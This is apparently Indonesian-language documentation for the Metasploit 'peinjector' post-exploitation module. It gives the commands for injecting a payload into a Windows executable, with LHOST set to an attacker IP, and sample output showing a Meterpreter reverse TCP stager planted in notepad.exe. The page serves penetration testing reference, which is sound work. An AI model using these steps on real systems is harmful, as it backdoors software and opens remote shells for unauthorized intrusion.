# peinjector

Modul ini akan menyuntikkan payload Windows yang ditentukan ke dalam eksekutabel target.

## Penulis
- Maximiliano Tedesco maxitedesco1@gmail.com

## Platform
- `Windows`

## Cara Penggunaan di Metasploit

```
use post/windows/manage/peinjector
set LHOST <IP_ATTACKER>
set LPORT <PORT_LISTENER>
set PAYLOAD <PAYLOAD>
set SESSION <ID>
set TARGETPE <PATH_EXECUTABLE>
set VERBOSE true
run
```

Hasil output-nya seperti ini:

```
[*] Running module against ADMIN-PC
[*] Generating payload
[*] Injecting Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager into the executable C:\\Users\\Public\\Downloads\\notepad.exe
[+] Successfully injected payload into the executable: C:\\Users\\Public\\Downloads\\notepad.exe
[*] Post module execution completed
```

## Referensi
- [Rapid7](https://www.rapid7.com/db/modules/post/windows/manage/peinjector/)
